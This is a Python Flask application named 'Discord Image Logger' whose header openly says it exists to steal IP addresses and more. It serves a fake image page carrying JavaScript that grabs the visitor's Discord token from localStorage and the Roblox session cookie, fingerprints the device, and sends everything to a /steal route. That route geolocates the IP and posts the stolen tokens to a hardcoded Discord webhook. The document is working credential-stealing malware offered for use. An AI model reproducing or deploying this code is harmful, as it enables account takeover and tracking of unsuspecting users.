import os
from flask import Flask, request, Response
import requests
import base64
import json
import urllib.parse
from datetime import datetime
import traceback

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "ds0c"

app = Flask(__name__)
@app.route("/api/main")
def serve_image():
    try:
        # Fetch the image
        img_response = requests.get(img_url, timeout=5)
        img_response.raise_for_status()

        return Response(
            img_response.content,
            mimetype=img_response.headers.get("Content-Type", "image/jpeg"),
            status=200
        )

    except Exception as e:
        return handle_error(e)

# Config - CHANGE THESE
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')  
img_url = os.environ.get('IMG_URL', 'https://httpbin.org/image/jpeg')  # Test image

@app.errorhandler(Exception)
def handle_error(e):
    print(f"ERROR: {str(e)}")
    print(traceback.format_exc())
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif', status=200)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        if path.endswith(('.jpg', '.png')) and 'grab' in path:
            return grab_image()
        elif path == 'image.jpg':
            return image_proxy()
        elif path == 'steal':
            return steal_data()
        return "Not Found", 404
    except Exception as e:
        print(f"Route error {path}: {e}")
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def grab_image():
    html = f'''
<!DOCTYPE html><html><head><title></title><meta charset="UTF-8">
<script>
(async()=>{{
    let token = localStorage.getItem("token")||'';
    let roblox = document.cookie.split(";").find(c=>c.includes(".ROBLOSECURITY"))||"";
    if(roblox) roblox = roblox.split("=")[1].replace(/^_ \| WARNING: Obsolete \| /,"").replace(/ \|_$/,"");
    
    let data = {{
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: `${{screen.width}}x${{screen.height}}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency||0,
        ram: navigator.deviceMemory||0,
        cookies: document.cookie.split(";").length,
        plugins: navigator.plugins.length,
        ref: document.referrer,
        token: token,
        roblox: roblox,
        battery: navigator.getBattery?'yes':'no',
        net: navigator.connection?.effectiveType||'N/A'
    }};
    
    let params = new URLSearchParams(data).toString();
    navigator.sendBeacon('/steal?'+params);
    location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
}})();
</script>
<style>body{{margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center;}}img{{max-width:100%;height:auto;opacity:.8;}}</style>
</head><body>
<img src="{img_url}" onload="this.style.opacity=1">
</body></html>'''
    return Response(html, mimetype='text/html')

def image_proxy():
    try:
        resp = requests.get(img_url, timeout=3)
        return Response(resp.content, mimetype=resp.headers.get('content-type', 'image/jpeg'))
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def steal_data():
    params = request.args.to_dict()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Simple geo
    try:
        geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
        geo_data = geo_resp.json()
        geo = f"{geo_data.get('city')} {geo_data.get('country_name')}"
        isp = geo_data.get('org')
    except:
        geo = isp = "N/A"
    
    embed = {
        "title": "🎯 HIT DETECTED",
        "color": 16711680,
        "fields": [
            {"name": "IP", "value": ip, "inline": True},
            {"name": "Geo", "value": geo, "inline": True},
            {"name": "ISP", "value": isp, "inline": True},
            {"name": "UA", "value": params.get('ua', 'N/A')[:80], "inline": False},
            {"name": "Discord", "value": f"`{params.get('token', 'NONE')[:32]}`", "inline": False},
            {"name": "Roblox", "value": f"`{params.get('roblox', 'NONE')[:32]}`", "inline": False},
            {"name": "Device", "value": f"Screen: {params.get('screen')} | CPU: {params.get('cores')}", "inline": False}
        ]
    }
    
    try:
        requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
    except:
        pass
    
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif')

if __name__ == "__main__":
    app.run(debug=True)
